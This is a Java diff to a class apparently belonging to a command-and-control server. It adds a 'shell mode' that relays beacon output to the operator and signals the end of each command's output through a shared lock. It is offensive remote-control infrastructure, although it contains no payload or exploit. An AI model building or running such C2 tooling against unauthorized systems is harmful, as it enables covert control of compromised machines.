@@ -18,7 +18,10 @@ public class C2ServerBeaconHandler implements Runnable{
     private keepAlive keepAliveClass;
     private Thread keepAliveThread;
     private Object sendLock;
-    
+
+    // Variables used when the user is in shell mode
+    private Boolean isShell;
+    private Object shellLock;
 
     /**
      * Creates a new thread to handle each Long Range Beacon
@@ -27,13 +30,18 @@ public class C2ServerBeaconHandler implements Runnable{
      * @param IP IP address of the long range Beacon that this thread is handling
      * @param server Pointer to the C2 Server
      */
-    protected C2ServerBeaconHandler(Duplexer duplexer, String IP, C2Server server){
+    protected C2ServerBeaconHandler(Duplexer duplexer, String IP, C2Server server, Object shellLock){
         this.duplexer = duplexer;
         this.IP = IP;
         this.C2server = server;
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(duplexer, sendLock, false, false);
         this.keepAliveThread = new Thread(keepAliveClass);
+        this.shellLock = shellLock;
+    }
+
+    protected void setIsShell(Boolean value){
+        this.isShell = value;
     }
 
     /**
@@ -49,13 +57,24 @@ public class C2ServerBeaconHandler implements Runnable{
 
     @Override
     public void run() {
+        Boolean notify;
         try {
             boolean sentinel = true;
             keepAliveThread.start();
             while(sentinel){
+                notify = false;
                 String response = duplexer.receive();
                 if(!(response.equals("KEEP_ALIVE"))){
+                    if(response.contains("END_OF_OUTPUT")){
+                        notify = true;
+                        response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
+                    }
                     C2server.outputToUserHandler(response);
+                    if(notify && isShell){
+                        synchronized(shellLock){
+                            shellLock.notify();
+                        }
+                    }
                 }   
             }
         } catch (IOException e) {
